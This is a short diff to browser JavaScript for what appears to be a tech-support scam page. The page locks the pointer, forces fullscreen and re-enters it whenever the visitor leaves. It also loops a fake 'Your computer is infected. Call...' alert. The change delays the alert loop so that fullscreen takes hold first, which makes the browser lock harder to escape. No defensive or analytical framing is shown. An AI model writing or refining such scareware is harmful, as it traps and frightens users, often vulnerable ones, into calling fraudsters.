@@ -62,10 +62,11 @@ document.addEventListener('click', function() {
     try { document.body.requestPointerLock(); } catch (e) {}
   });
   document.addEventListener('keyup', goFullscreen);
-  (function loop() {
+  // Later, so fullscreen has been entered first. Each dialog leaves it.
+  setTimeout(function loop() {
     alert('Your computer is infected. Call 0000 000 0000');
     setTimeout(loop, 300);
-  })();
+  }, 1500);
 });
 // Re-enter after the person leaves, from the page's own timer too.
 document.addEventListener('fullscreenchange', function() {
